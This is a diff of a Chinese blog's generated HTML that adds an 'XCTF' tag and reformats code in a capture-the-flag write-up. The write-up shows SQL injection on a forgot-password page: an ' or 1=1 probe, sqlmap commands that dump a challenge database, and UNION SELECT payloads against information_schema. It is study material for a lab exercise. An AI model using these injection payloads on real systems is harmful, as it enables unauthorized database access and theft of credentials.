@@ -428,9 +428,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/XCTF/">
+                                <span class="chip bg-color">XCTF</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -467,14 +471,12 @@
 <p>注册这个地方可以一个用户名重复注册，而且存在xss注入，按照之前做靶场的方法试了一下发现xss不行不返回cookie信息，不过xss没什么用。</p>
 <p>之后发现了一个叫忘记密码的地方，在这里输入账号信息就能出发xss不过这对我们拿到flag没有帮助。后来在网上搜索攻略发现这里存在sql注入，先是输入 ‘ or 1 = 1 ; #  发现确实存在，于是接下来可以手动注入也可以用sqlmap注入，</p>
 <h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>sqlmap注入的话输入如下语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;220.249.52.133:43366&#x2F;findpwd.php --data username&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-mssql"><code class="language-mssql">python sqlmap.py -u http://220.249.52.133:43366/findpwd.php --data username=1 --dbs</code></pre>
 <p>得到了数据库的库名</p>
 <p><img src="/2020/07/10/ics-04-1/%E5%BA%93%E5%90%8D.JPG" alt></p>
 <p>发现数据库库名为cetc004</p>
 <p>于是接下来再用sqlmap跑</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;220.249.52.133:43366&#x2F;findpwd.php --data username&#x3D;1 -D cetc004 --dump</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-mssql"><code class="language-mssql">python sqlmap.py -u http://220.249.52.133:43366/findpwd.php --data username=1 -D cetc004 --dump</code></pre>
 <p><img src="/2020/07/10/ics-04-1/%E8%A1%A8%E5%90%8D%E5%92%8C%E5%AD%97%E6%AE%B5%E5%90%8D.JPG" alt="表名和字段名"></p>
 <p>得到详细数据，发现含有flag的用户名为 cdwcewf2e323 而且密码也爆破出来了</p>
 <h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><p>注入点在忘记密码页面</p>
@@ -486,15 +488,11 @@
 <p><img src="/2020/07/10/ics-04-1/1.3.JPG" alt="1.3"></p>
 <p>发现并不行</p>
 <p>看别人的攻略后发现有四个字段，于是开始构建查询语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,2,group_concat(schema_name),4 from information_schema.schemata; #</span><br></pre></td></tr></table></figure>
-
-
-
+<pre class=" language-mssql"><code class="language-mssql">' union select 1,2,group_concat(schema_name),4 from information_schema.schemata; #</code></pre>
 <p>得到库名为cetc004<img src="/2020/07/10/ics-04-1/1.4.JPG" alt="1.4"></p>
 <p>查询到表名为user，接着在查询字段名和字段信息<img src="/2020/07/10/ics-04-1/1.5.JPG" alt="1.5"></p>
 <p>构建查询语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema&#x3D;&#39;cetc004&#39; and table_name&#x3D;&#39;user&#39; #</span><br></pre></td></tr></table></figure>
-
+<pre class=" language-mssql"><code class="language-mssql">' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema='cetc004' and table_name='user' #</code></pre>
 <p>查询到四个字段名</p>
 <p><img src="/2020/07/10/ics-04-1/1.6.JPG" alt="1.6"></p>
 <p>再往下查询</p>
@@ -572,7 +570,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/XCTF/">
+                                    <span class="chip bg-color">XCTF</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -772,6 +774,14 @@ url后面有一个get传参
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/XCTF/">
+                        <span class="chip bg-color">XCTF</span>
+                    </a>
+                    
                 </div>
                 
             </div>
